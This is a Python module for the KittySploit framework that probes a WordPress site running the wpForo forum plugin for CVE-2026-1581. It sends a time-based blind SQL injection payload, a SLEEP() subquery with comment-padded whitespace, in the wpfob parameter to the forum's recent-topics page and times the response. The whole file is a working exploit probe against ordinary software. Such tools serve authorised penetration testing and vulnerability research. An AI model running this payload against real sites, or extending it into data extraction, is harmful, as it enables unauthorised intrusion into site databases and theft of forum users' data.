#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""wpForo CVE-2026-1581 — wpfob sleep injection."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "wpForo CVE-2026-1581 SQLi probe",
        "description": "GET wpfob parameter with SLEEP() for manual timing confirmation.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-1581"],
        "tags": ["wordpress", "wpforo", "sqli", "auxiliary", "cve-2026-1581"],
    }

    path = OptString("/", "WordPress base path", required=False)
    forum_path = OptString("/community/recent/", "Recent topics path", required=False)
    sleep_seconds = OptInteger(8, "Sleep seconds", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        s = int(self.sleep_seconds or 8)
        wpfob = f"(SELECT/**/1/**/FROM/**/(SELECT/**/SLEEP({s}))a)"
        start = time.monotonic()
        self.http_request(
            method="GET",
            path=self._join((self.forum_path or "/community/recent/").strip()),
            params={"wpfob": wpfob},
            timeout=s + 20,
        )
        print_status(f"Elapsed {time.monotonic() - start:.2f}s")
        return True
